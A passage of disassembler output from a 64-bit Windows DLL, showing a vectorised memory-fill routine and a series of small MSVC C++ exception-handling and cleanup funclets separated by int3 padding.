   18000db21:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   18000db28:	73 b6                	jae    0x18000dae0
   18000db2a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   18000db2e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   18000db32:	4d 8b d9             	mov    %r9,%r11
   18000db35:	49 c1 eb 05          	shr    $0x5,%r11
   18000db39:	47 8b 9c 9a 50 6a 01 	mov    0x16a50(%r10,%r11,4),%r11d
   18000db40:	00 
   18000db41:	4d 03 da             	add    %r10,%r11
   18000db44:	41 ff e3             	jmp    *%r11
   18000db47:	c4 a1 7e 7f 84 09 00 	vmovdqu %ymm0,-0x100(%rcx,%r9,1)
   18000db4e:	ff ff ff 
   18000db51:	c4 a1 7e 7f 84 09 20 	vmovdqu %ymm0,-0xe0(%rcx,%r9,1)
   18000db58:	ff ff ff 
   18000db5b:	c4 a1 7e 7f 84 09 40 	vmovdqu %ymm0,-0xc0(%rcx,%r9,1)
   18000db62:	ff ff ff 
   18000db65:	c4 a1 7e 7f 84 09 60 	vmovdqu %ymm0,-0xa0(%rcx,%r9,1)
   18000db6c:	ff ff ff 
   18000db6f:	c4 a1 7e 7f 44 09 80 	vmovdqu %ymm0,-0x80(%rcx,%r9,1)
   18000db76:	c4 a1 7e 7f 44 09 a0 	vmovdqu %ymm0,-0x60(%rcx,%r9,1)
   18000db7d:	c4 a1 7e 7f 44 09 c0 	vmovdqu %ymm0,-0x40(%rcx,%r9,1)
   18000db84:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   18000db8b:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   18000db8f:	c5 f8 77             	vzeroupper
   18000db92:	c3                   	ret
   18000db93:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000db9a:	84 00 00 00 00 00 
   18000dba0:	c5 fd e7 01          	vmovntdq %ymm0,(%rcx)
   18000dba4:	c5 fd e7 41 20       	vmovntdq %ymm0,0x20(%rcx)
   18000dba9:	c5 fd e7 41 40       	vmovntdq %ymm0,0x40(%rcx)
   18000dbae:	c5 fd e7 41 60       	vmovntdq %ymm0,0x60(%rcx)
   18000dbb3:	c5 fd e7 81 80 00 00 	vmovntdq %ymm0,0x80(%rcx)
   18000dbba:	00 
   18000dbbb:	c5 fd e7 81 a0 00 00 	vmovntdq %ymm0,0xa0(%rcx)
   18000dbc2:	00 
   18000dbc3:	c5 fd e7 81 c0 00 00 	vmovntdq %ymm0,0xc0(%rcx)
   18000dbca:	00 
   18000dbcb:	c5 fd e7 81 e0 00 00 	vmovntdq %ymm0,0xe0(%rcx)
   18000dbd2:	00 
   18000dbd3:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   18000dbda:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   18000dbe1:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   18000dbe8:	73 b6                	jae    0x18000dba0
   18000dbea:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   18000dbee:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   18000dbf2:	4d 8b d9             	mov    %r9,%r11
   18000dbf5:	49 c1 eb 05          	shr    $0x5,%r11
   18000dbf9:	47 8b 9c 9a 74 6a 01 	mov    0x16a74(%r10,%r11,4),%r11d
   18000dc00:	00 
   18000dc01:	4d 03 da             	add    %r10,%r11
   18000dc04:	41 ff e3             	jmp    *%r11
   18000dc07:	c4 a1 7d e7 84 09 00 	vmovntdq %ymm0,-0x100(%rcx,%r9,1)
   18000dc0e:	ff ff ff 
   18000dc11:	c4 a1 7d e7 84 09 20 	vmovntdq %ymm0,-0xe0(%rcx,%r9,1)
   18000dc18:	ff ff ff 
   18000dc1b:	c4 a1 7d e7 84 09 40 	vmovntdq %ymm0,-0xc0(%rcx,%r9,1)
   18000dc22:	ff ff ff 
   18000dc25:	c4 a1 7d e7 84 09 60 	vmovntdq %ymm0,-0xa0(%rcx,%r9,1)
   18000dc2c:	ff ff ff 
   18000dc2f:	c4 a1 7d e7 44 09 80 	vmovntdq %ymm0,-0x80(%rcx,%r9,1)
   18000dc36:	c4 a1 7d e7 44 09 a0 	vmovntdq %ymm0,-0x60(%rcx,%r9,1)
   18000dc3d:	c4 a1 7d e7 44 09 c0 	vmovntdq %ymm0,-0x40(%rcx,%r9,1)
   18000dc44:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   18000dc4b:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   18000dc4f:	0f ae f8             	sfence
   18000dc52:	c5 f8 77             	vzeroupper
   18000dc55:	c3                   	ret
   18000dc56:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000dc5d:	00 00 00 
   18000dc60:	4c 3b 05 f1 c3 00 00 	cmp    0xc3f1(%rip),%r8        # 0x18001a058
   18000dc67:	76 0d                	jbe    0x18000dc76
   18000dc69:	f6 05 9c ce 00 00 02 	testb  $0x2,0xce9c(%rip)        # 0x18001ab0c
   18000dc70:	0f 85 2a fd ff ff    	jne    0x18000d9a0
   18000dc76:	4c 8b c9             	mov    %rcx,%r9
   18000dc79:	49 83 e1 0f          	and    $0xf,%r9
   18000dc7d:	49 83 e9 10          	sub    $0x10,%r9
   18000dc81:	49 2b c9             	sub    %r9,%rcx
   18000dc84:	49 2b d1             	sub    %r9,%rdx
   18000dc87:	4d 03 c1             	add    %r9,%r8
   18000dc8a:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   18000dc91:	76 4b                	jbe    0x18000dcde
   18000dc93:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000dc9a:	84 00 00 00 00 00 
   18000dca0:	66 0f 7f 01          	movdqa %xmm0,(%rcx)
   18000dca4:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%rcx)
   18000dca9:	66 0f 7f 41 20       	movdqa %xmm0,0x20(%rcx)
   18000dcae:	66 0f 7f 41 30       	movdqa %xmm0,0x30(%rcx)
   18000dcb3:	66 0f 7f 41 40       	movdqa %xmm0,0x40(%rcx)
   18000dcb8:	66 0f 7f 41 50       	movdqa %xmm0,0x50(%rcx)
   18000dcbd:	66 0f 7f 41 60       	movdqa %xmm0,0x60(%rcx)
   18000dcc2:	66 0f 7f 41 70       	movdqa %xmm0,0x70(%rcx)
   18000dcc7:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   18000dcce:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   18000dcd5:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   18000dcdc:	73 c2                	jae    0x18000dca0
   18000dcde:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   18000dce2:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   18000dce6:	4d 8b d9             	mov    %r9,%r11
   18000dce9:	49 c1 eb 04          	shr    $0x4,%r11
   18000dced:	47 8b 9c 9a 98 6a 01 	mov    0x16a98(%r10,%r11,4),%r11d
   18000dcf4:	00 
   18000dcf5:	4d 03 da             	add    %r10,%r11
   18000dcf8:	41 ff e3             	jmp    *%r11
   18000dcfb:	f3 42 0f 7f 44 09 80 	movdqu %xmm0,-0x80(%rcx,%r9,1)
   18000dd02:	f3 42 0f 7f 44 09 90 	movdqu %xmm0,-0x70(%rcx,%r9,1)
   18000dd09:	f3 42 0f 7f 44 09 a0 	movdqu %xmm0,-0x60(%rcx,%r9,1)
   18000dd10:	f3 42 0f 7f 44 09 b0 	movdqu %xmm0,-0x50(%rcx,%r9,1)
   18000dd17:	f3 42 0f 7f 44 09 c0 	movdqu %xmm0,-0x40(%rcx,%r9,1)
   18000dd1e:	f3 42 0f 7f 44 09 d0 	movdqu %xmm0,-0x30(%rcx,%r9,1)
   18000dd25:	f3 42 0f 7f 44 09 e0 	movdqu %xmm0,-0x20(%rcx,%r9,1)
   18000dd2c:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   18000dd33:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   18000dd37:	c3                   	ret
   18000dd38:	cc                   	int3
   18000dd39:	cc                   	int3
   18000dd3a:	cc                   	int3
   18000dd3b:	cc                   	int3
   18000dd3c:	cc                   	int3
   18000dd3d:	cc                   	int3
   18000dd3e:	cc                   	int3
   18000dd3f:	cc                   	int3
   18000dd40:	cc                   	int3
   18000dd41:	cc                   	int3
   18000dd42:	cc                   	int3
   18000dd43:	cc                   	int3
   18000dd44:	cc                   	int3
   18000dd45:	cc                   	int3
   18000dd46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000dd4d:	00 00 00 
   18000dd50:	40 55                	rex push %rbp
   18000dd52:	48 83 ec 20          	sub    $0x20,%rsp
   18000dd56:	48 8b ea             	mov    %rdx,%rbp
   18000dd59:	0f b6 4d 60          	movzbl 0x60(%rbp),%ecx
   18000dd5d:	48 83 c4 20          	add    $0x20,%rsp
   18000dd61:	5d                   	pop    %rbp
   18000dd62:	e9 29 3d ff ff       	jmp    0x180001a90
   18000dd67:	cc                   	int3
   18000dd68:	cc                   	int3
   18000dd69:	cc                   	int3
   18000dd6a:	cc                   	int3
   18000dd6b:	cc                   	int3
   18000dd6c:	cc                   	int3
   18000dd6d:	cc                   	int3
   18000dd6e:	cc                   	int3
   18000dd6f:	cc                   	int3
   18000dd70:	40 55                	rex push %rbp
   18000dd72:	48 83 ec 20          	sub    $0x20,%rsp
   18000dd76:	48 8b ea             	mov    %rdx,%rbp
   18000dd79:	0f b6 4d 20          	movzbl 0x20(%rbp),%ecx
   18000dd7d:	e8 0e 3d ff ff       	call   0x180001a90
   18000dd82:	90                   	nop
   18000dd83:	48 83 c4 20          	add    $0x20,%rsp
   18000dd87:	5d                   	pop    %rbp
   18000dd88:	c3                   	ret
   18000dd89:	cc                   	int3
   18000dd8a:	40 55                	rex push %rbp
   18000dd8c:	48 83 ec 20          	sub    $0x20,%rsp
   18000dd90:	48 8b ea             	mov    %rdx,%rbp
   18000dd93:	48 83 c4 20          	add    $0x20,%rsp
   18000dd97:	5d                   	pop    %rbp
   18000dd98:	e9 f3 3b ff ff       	jmp    0x180001990
   18000dd9d:	cc                   	int3
   18000dd9e:	cc                   	int3
   18000dd9f:	cc                   	int3
   18000dda0:	40 55                	rex push %rbp
   18000dda2:	48 83 ec 30          	sub    $0x30,%rsp
   18000dda6:	48 8b ea             	mov    %rdx,%rbp
   18000dda9:	48 8b 01             	mov    (%rcx),%rax
   18000ddac:	8b 10                	mov    (%rax),%edx
   18000ddae:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   18000ddb3:	89 54 24 20          	mov    %edx,0x20(%rsp)
   18000ddb7:	4c 8d 0d 32 35 ff ff 	lea    -0xcace(%rip),%r9        # 0x1800012f0
   18000ddbe:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   18000ddc2:	8b 55 68             	mov    0x68(%rbp),%edx
   18000ddc5:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   18000ddc9:	e8 32 3b ff ff       	call   0x180001900
   18000ddce:	90                   	nop
   18000ddcf:	48 83 c4 30          	add    $0x30,%rsp
   18000ddd3:	5d                   	pop    %rbp
   18000ddd4:	c3                   	ret
   18000ddd5:	cc                   	int3
   18000ddd6:	cc                   	int3
   18000ddd7:	cc                   	int3
   18000ddd8:	cc                   	int3
   18000ddd9:	cc                   	int3
   18000ddda:	cc                   	int3
   18000dddb:	cc                   	int3
   18000dddc:	cc                   	int3
   18000dddd:	cc                   	int3
   18000ddde:	cc                   	int3
   18000dddf:	cc                   	int3
   18000dde0:	40 55                	rex push %rbp
   18000dde2:	48 8b ea             	mov    %rdx,%rbp
   18000dde5:	48 8b 01             	mov    (%rcx),%rax
   18000dde8:	33 c9                	xor    %ecx,%ecx
   18000ddea:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   18000ddf0:	0f 94 c1             	sete   %cl
   18000ddf3:	8b c1                	mov    %ecx,%eax
   18000ddf5:	5d                   	pop    %rbp
   18000ddf6:	c3                   	ret
   18000ddf7:	cc                   	int3
   18000ddf8:	cc                   	int3
   18000ddf9:	cc                   	int3
   18000ddfa:	cc                   	int3
   18000ddfb:	cc                   	int3
   18000ddfc:	cc                   	int3
   18000ddfd:	cc                   	int3
   18000ddfe:	cc                   	int3
   18000ddff:	cc                   	int3
   18000de00:	40 53                	rex push %rbx
   18000de02:	55                   	push   %rbp
   18000de03:	48 83 ec 28          	sub    $0x28,%rsp
   18000de07:	48 8b ea             	mov    %rdx,%rbp
   18000de0a:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   18000de0e:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   18000de12:	74 6c                	je     0x18000de80
   18000de14:	48 8b 45 30          	mov    0x30(%rbp),%rax
   18000de18:	48 8b 08             	mov    (%rax),%rcx
   18000de1b:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   18000de1f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000de23:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   18000de29:	75 55                	jne    0x18000de80
   18000de2b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000de2f:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   18000de33:	75 4b                	jne    0x18000de80
   18000de35:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000de39:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   18000de40:	74 1a                	je     0x18000de5c
   18000de42:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000de46:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   18000de4d:	74 0d                	je     0x18000de5c
   18000de4f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000de53:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   18000de5a:	75 24                	jne    0x18000de80
   18000de5c:	e8 3f 47 ff ff       	call   0x1800025a0
   18000de61:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   18000de65:	48 89 48 20          	mov    %rcx,0x20(%rax)
   18000de69:	48 8b 45 30          	mov    0x30(%rbp),%rax
   18000de6d:	48 8b 58 08          	mov    0x8(%rax),%rbx
   18000de71:	e8 2a 47 ff ff       	call   0x1800025a0
   18000de76:	48 89 58 28          	mov    %rbx,0x28(%rax)
   18000de7a:	e8 31 7b ff ff       	call   0x1800059b0
   18000de7f:	90                   	nop
   18000de80:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   18000de87:	8b 45 20             	mov    0x20(%rbp),%eax
   18000de8a:	48 83 c4 28          	add    $0x28,%rsp
   18000de8e:	5d                   	pop    %rbp
   18000de8f:	5b                   	pop    %rbx
   18000de90:	c3                   	ret
   18000de91:	cc                   	int3
   18000de92:	cc                   	int3
   18000de93:	cc                   	int3
   18000de94:	cc                   	int3
   18000de95:	cc                   	int3
   18000de96:	cc                   	int3
   18000de97:	cc                   	int3
   18000de98:	cc                   	int3
   18000de99:	cc                   	int3
   18000de9a:	cc                   	int3
   18000de9b:	cc                   	int3
   18000de9c:	cc                   	int3
   18000de9d:	cc                   	int3
   18000de9e:	cc                   	int3
   18000de9f:	cc                   	int3
   18000dea0:	40 53                	rex push %rbx
   18000dea2:	55                   	push   %rbp
   18000dea3:	57                   	push   %rdi
   18000dea4:	48 83 ec 40          	sub    $0x40,%rsp
   18000dea8:	48 8b ea             	mov    %rdx,%rbp
   18000deab:	48 89 4d 48          	mov    %rcx,0x48(%rbp)
   18000deaf:	e8 ec 46 ff ff       	call   0x1800025a0
   18000deb4:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   18000debb:	48 89 48 70          	mov    %rcx,0x70(%rax)
   18000debf:	48 8b bd 98 00 00 00 	mov    0x98(%rbp),%rdi
   18000dec6:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   18000deca:	e8 d1 46 ff ff       	call   0x1800025a0
   18000decf:	48 89 58 60          	mov    %rbx,0x60(%rax)
   18000ded3:	48 8b 45 48          	mov    0x48(%rbp),%rax
   18000ded7:	48 8b 08             	mov    (%rax),%rcx
   18000deda:	48 8b 59 38          	mov    0x38(%rcx),%rbx
   18000dede:	e8 bd 46 ff ff       	call   0x1800025a0
   18000dee3:	48 89 58 68          	mov    %rbx,0x68(%rax)
   18000dee7:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   18000deeb:	c6 44 24 38 01       	movb   $0x1,0x38(%rsp)
   18000def0:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   18000def7:	00 00 
   18000def9:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   18000df00:	00 
   18000df01:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   18000df08:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000df0d:	4c 8b cf             	mov    %rdi,%r9
   18000df10:	4c 8b 85 90 00 00 00 	mov    0x90(%rbp),%r8
   18000df17:	48 8b 95 88 00 00 00 	mov    0x88(%rbp),%rdx
   18000df1e:	48 8b 09             	mov    (%rcx),%rcx
   18000df21:	e8 aa 60 ff ff       	call   0x180003fd0
   18000df26:	e8 75 46 ff ff       	call   0x1800025a0
   18000df2b:	48 c7 40 70 00 00 00 	movq   $0x0,0x70(%rax)
   18000df32:	00 
   18000df33:	c7 45 40 01 00 00 00 	movl   $0x1,0x40(%rbp)
   18000df3a:	c7 45 44 01 00 00 00 	movl   $0x1,0x44(%rbp)
   18000df41:	8b 45 44             	mov    0x44(%rbp),%eax
   18000df44:	48 83 c4 40          	add    $0x40,%rsp
   18000df48:	5f                   	pop    %rdi
   18000df49:	5d                   	pop    %rbp
   18000df4a:	5b                   	pop    %rbx
   18000df4b:	c3                   	ret
   18000df4c:	cc                   	int3
   18000df4d:	cc                   	int3
   18000df4e:	cc                   	int3
   18000df4f:	cc                   	int3
   18000df50:	40 55                	rex push %rbp
   18000df52:	48 83 ec 20          	sub    $0x20,%rsp
   18000df56:	48 8b ea             	mov    %rdx,%rbp
   18000df59:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   18000df5d:	48 8b 95 d8 00 00 00 	mov    0xd8(%rbp),%rdx
   18000df64:	e8 a7 63 ff ff       	call   0x180004310
   18000df69:	90                   	nop
   18000df6a:	48 83 c4 20          	add    $0x20,%rsp
   18000df6e:	5d                   	pop    %rbp
   18000df6f:	c3                   	ret
   18000df70:	cc                   	int3
   18000df71:	40 53                	rex push %rbx
   18000df73:	55                   	push   %rbp
   18000df74:	48 83 ec 28          	sub    $0x28,%rsp
   18000df78:	48 8b ea             	mov    %rdx,%rbp
   18000df7b:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   18000df7f:	e8 ec 4e ff ff       	call   0x180002e70
   18000df84:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   18000df88:	75 48                	jne    0x18000dfd2
   18000df8a:	48 8b 9d d8 00 00 00 	mov    0xd8(%rbp),%rbx
   18000df91:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   18000df97:	75 39                	jne    0x18000dfd2
   18000df99:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   18000df9d:	75 33                	jne    0x18000dfd2
   18000df9f:	81 7b 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rbx)
   18000dfa6:	74 12                	je     0x18000dfba
   18000dfa8:	81 7b 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rbx)
   18000dfaf:	74 09                	je     0x18000dfba
   18000dfb1:	81 7b 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rbx)
   18000dfb8:	75 18                	jne    0x18000dfd2
   18000dfba:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   18000dfbe:	e8 bd 43 ff ff       	call   0x180002380
   18000dfc3:	85 c0                	test   %eax,%eax
   18000dfc5:	74 0b                	je     0x18000dfd2
   18000dfc7:	b2 01                	mov    $0x1,%dl
   18000dfc9:	48 8b cb             	mov    %rbx,%rcx
   18000dfcc:	e8 2f 43 ff ff       	call   0x180002300
   18000dfd1:	90                   	nop
   18000dfd2:	e8 c9 45 ff ff       	call   0x1800025a0
   18000dfd7:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   18000dfdb:	48 89 48 20          	mov    %rcx,0x20(%rax)
   18000dfdf:	e8 bc 45 ff ff       	call   0x1800025a0
   18000dfe4:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   18000dfe8:	48 89 48 28          	mov    %rcx,0x28(%rax)
   18000dfec:	48 83 c4 28          	add    $0x28,%rsp
   18000dff0:	5d                   	pop    %rbp
   18000dff1:	5b                   	pop    %rbx
   18000dff2:	c3                   	ret
   18000dff3:	cc                   	int3
   18000dff4:	cc                   	int3
   18000dff5:	cc                   	int3
   18000dff6:	cc                   	int3
   18000dff7:	cc                   	int3
   18000dff8:	cc                   	int3
   18000dff9:	cc                   	int3
   18000dffa:	cc                   	int3
   18000dffb:	cc                   	int3
   18000dffc:	cc                   	int3
   18000dffd:	cc                   	int3
   18000dffe:	cc                   	int3
   18000dfff:	cc                   	int3
   18000e000:	40 55                	rex push %rbp
   18000e002:	48 83 ec 20          	sub    $0x20,%rsp
   18000e006:	48 8b ea             	mov    %rdx,%rbp
   18000e009:	e8 e2 43 ff ff       	call   0x1800023f0
   18000e00e:	90                   	nop
   18000e00f:	48 83 c4 20          	add    $0x20,%rsp
   18000e013:	5d                   	pop    %rbp
   18000e014:	c3                   	ret
   18000e015:	cc                   	int3
   18000e016:	40 55                	rex push %rbp
   18000e018:	48 83 ec 20          	sub    $0x20,%rsp
   18000e01c:	48 8b ea             	mov    %rdx,%rbp
   18000e01f:	e8 7c 45 ff ff       	call   0x1800025a0
   18000e024:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   18000e028:	7e 08                	jle    0x18000e032
   18000e02a:	e8 71 45 ff ff       	call   0x1800025a0
   18000e02f:	ff 48 30             	decl   0x30(%rax)
   18000e032:	48 83 c4 20          	add    $0x20,%rsp
   18000e036:	5d                   	pop    %rbp
   18000e037:	c3                   	ret
   18000e038:	cc                   	int3
   18000e039:	40 55                	rex push %rbp
   18000e03b:	48 83 ec 20          	sub    $0x20,%rsp
   18000e03f:	48 8b ea             	mov    %rdx,%rbp
   18000e042:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   18000e046:	8b 09                	mov    (%rcx),%ecx
   18000e048:	48 83 c4 20          	add    $0x20,%rsp
   18000e04c:	5d                   	pop    %rbp
   18000e04d:	e9 1a 89 ff ff       	jmp    0x18000696c
   18000e052:	cc                   	int3
   18000e053:	40 55                	rex push %rbp
   18000e055:	48 83 ec 20          	sub    $0x20,%rsp
   18000e059:	48 8b ea             	mov    %rdx,%rbp
   18000e05c:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   18000e060:	48 8b 01             	mov    (%rcx),%rax
   18000e063:	8b 08                	mov    (%rax),%ecx
   18000e065:	89 4d 24             	mov    %ecx,0x24(%rbp)
   18000e068:	33 c0                	xor    %eax,%eax
   18000e06a:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   18000e070:	0f 94 c0             	sete   %al
   18000e073:	89 45 20             	mov    %eax,0x20(%rbp)
   18000e076:	8b 45 20             	mov    0x20(%rbp),%eax
   18000e079:	48 83 c4 20          	add    $0x20,%rsp
   18000e07d:	5d                   	pop    %rbp
   18000e07e:	c3                   	ret
   18000e07f:	cc                   	int3
   18000e080:	40 55                	rex push %rbp
   18000e082:	48 83 ec 20          	sub    $0x20,%rsp
   18000e086:	48 8b ea             	mov    %rdx,%rbp
   18000e089:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   18000e08d:	8b 09                	mov    (%rcx),%ecx
   18000e08f:	48 83 c4 20          	add    $0x20,%rsp
   18000e093:	5d                   	pop    %rbp
   18000e094:	e9 d3 88 ff ff       	jmp    0x18000696c
   18000e099:	cc                   	int3
   18000e09a:	40 55                	rex push %rbp
   18000e09c:	48 83 ec 20          	sub    $0x20,%rsp
   18000e0a0:	48 8b ea             	mov    %rdx,%rbp
   18000e0a3:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   18000e0a7:	8b 09                	mov    (%rcx),%ecx
   18000e0a9:	48 83 c4 20          	add    $0x20,%rsp
   18000e0ad:	5d                   	pop    %rbp
   18000e0ae:	e9 b9 88 ff ff       	jmp    0x18000696c
   18000e0b3:	cc                   	int3
   18000e0b4:	40 55                	rex push %rbp
   18000e0b6:	48 83 ec 20          	sub    $0x20,%rsp
   18000e0ba:	48 8b ea             	mov    %rdx,%rbp
   18000e0bd:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000e0c2:	48 83 c4 20          	add    $0x20,%rsp
   18000e0c6:	5d                   	pop    %rbp
   18000e0c7:	e9 a0 88 ff ff       	jmp    0x18000696c
   18000e0cc:	cc                   	int3
   18000e0cd:	40 55                	rex push %rbp
   18000e0cf:	48 83 ec 20          	sub    $0x20,%rsp
   18000e0d3:	48 8b ea             	mov    %rdx,%rbp
   18000e0d6:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000e0db:	48 83 c4 20          	add    $0x20,%rsp
   18000e0df:	5d                   	pop    %rbp
   18000e0e0:	e9 87 88 ff ff       	jmp    0x18000696c
   18000e0e5:	cc                   	int3
   18000e0e6:	cc                   	int3
   18000e0e7:	cc                   	int3
   18000e0e8:	cc                   	int3
   18000e0e9:	cc                   	int3
   18000e0ea:	cc                   	int3
   18000e0eb:	cc                   	int3
   18000e0ec:	cc                   	int3
   18000e0ed:	cc                   	int3
   18000e0ee:	cc                   	int3
   18000e0ef:	cc                   	int3
   18000e0f0:	40 55                	rex push %rbp
   18000e0f2:	48 83 ec 20          	sub    $0x20,%rsp
   18000e0f6:	48 8b ea             	mov    %rdx,%rbp
   18000e0f9:	33 c9                	xor    %ecx,%ecx
   18000e0fb:	48 83 c4 20          	add    $0x20,%rsp
   18000e0ff:	5d                   	pop    %rbp
   18000e100:	e9 67 88 ff ff       	jmp    0x18000696c
   18000e105:	cc                   	int3
   18000e106:	40 55                	rex push %rbp
   18000e108:	48 83 ec 20          	sub    $0x20,%rsp
   18000e10c:	48 8b ea             	mov    %rdx,%rbp
   18000e10f:	33 c9                	xor    %ecx,%ecx
   18000e111:	48 83 c4 20          	add    $0x20,%rsp
   18000e115:	5d                   	pop    %rbp
   18000e116:	e9 51 88 ff ff       	jmp    0x18000696c
   18000e11b:	cc                   	int3
   18000e11c:	40 55                	rex push %rbp
   18000e11e:	48 83 ec 20          	sub    $0x20,%rsp
   18000e122:	48 8b ea             	mov    %rdx,%rbp
   18000e125:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   18000e129:	74 0b                	je     0x18000e136
   18000e12b:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000e130:	e8 37 88 ff ff       	call   0x18000696c
   18000e135:	90                   	nop
   18000e136:	48 83 c4 20          	add    $0x20,%rsp
   18000e13a:	5d                   	pop    %rbp
   18000e13b:	c3                   	ret
   18000e13c:	cc                   	int3
   18000e13d:	40 55                	rex push %rbp
   18000e13f:	48 83 ec 20          	sub    $0x20,%rsp
   18000e143:	48 8b ea             	mov    %rdx,%rbp
   18000e146:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   18000e14a:	48 8b 09             	mov    (%rcx),%rcx
   18000e14d:	48 83 c4 20          	add    $0x20,%rsp
   18000e151:	5d                   	pop    %rbp
   18000e152:	e9 81 b6 ff ff       	jmp    0x1800097d8
   18000e157:	cc                   	int3
   18000e158:	40 55                	rex push %rbp
   18000e15a:	48 83 ec 20          	sub    $0x20,%rsp
   18000e15e:	48 8b ea             	mov    %rdx,%rbp
   18000e161:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   18000e168:	8b 09                	mov    (%rcx),%ecx
   18000e16a:	48 83 c4 20          	add    $0x20,%rsp
   18000e16e:	5d                   	pop    %rbp
   18000e16f:	e9 f8 87 ff ff       	jmp    0x18000696c
   18000e174:	cc                   	int3
   18000e175:	40 55                	rex push %rbp
   18000e177:	48 83 ec 20          	sub    $0x20,%rsp
   18000e17b:	48 8b ea             	mov    %rdx,%rbp
   18000e17e:	b9 04 00 00 00       	mov    $0x4,%ecx
   18000e183:	48 83 c4 20          	add    $0x20,%rsp
   18000e187:	5d                   	pop    %rbp
   18000e188:	e9 df 87 ff ff       	jmp    0x18000696c
   18000e18d:	cc                   	int3
   18000e18e:	40 55                	rex push %rbp
   18000e190:	48 83 ec 20          	sub    $0x20,%rsp
   18000e194:	48 8b ea             	mov    %rdx,%rbp
   18000e197:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   18000e19b:	8b 09                	mov    (%rcx),%ecx
   18000e19d:	48 83 c4 20          	add    $0x20,%rsp
   18000e1a1:	5d                   	pop    %rbp
   18000e1a2:	e9 05 d6 ff ff       	jmp    0x18000b7ac
   18000e1a7:	cc                   	int3
   18000e1a8:	40 55                	rex push %rbp
   18000e1aa:	48 83 ec 30          	sub    $0x30,%rsp
   18000e1ae:	48 8b ea             	mov    %rdx,%rbp
   18000e1b1:	8b 4d 60             	mov    0x60(%rbp),%ecx
   18000e1b4:	48 83 c4 30          	add    $0x30,%rsp
   18000e1b8:	5d                   	pop    %rbp
   18000e1b9:	e9 ee d5 ff ff       	jmp    0x18000b7ac
   18000e1be:	cc                   	int3
   18000e1bf:	40 55                	rex push %rbp
   18000e1c1:	48 83 ec 20          	sub    $0x20,%rsp
   18000e1c5:	48 8b ea             	mov    %rdx,%rbp
   18000e1c8:	b9 08 00 00 00       	mov    $0x8,%ecx
